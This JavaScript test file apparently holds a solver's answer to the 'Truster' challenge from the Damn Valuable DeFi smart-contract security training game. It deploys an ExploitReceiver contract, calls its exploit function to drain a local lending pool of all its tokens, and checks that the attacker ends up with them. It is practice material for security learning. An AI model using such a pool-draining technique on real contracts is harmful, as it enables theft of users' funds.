const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        // deploy the contract
        const ExploitReceiver = await ethers.getContractFactory('ExploitReceiver', attacker);
        this.attackerContract = await ExploitReceiver.deploy(this.token.address, this.pool.address);

        //Attack
        console.log(
            'Receiver balance before attacking: ',
            String(await this.token.balanceOf(attacker.address))
        );
        console.log(
            "Exploit balance before attacking: ",
            String(await this.token.balanceOf(this.attackerContract.address))
        );

        await this.attackerContract.connect(attacker);
        await this.attackerContract.exploit(attacker.address);

        console.log(
            "Receiver balance after attacking: ",
            String(await this.token.balanceOf(attacker.address))
        );
        console.log(
            "Exploit balance after attacking: ",
            String(await this.token.balanceOf(this.attackerContract.address))
        );
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

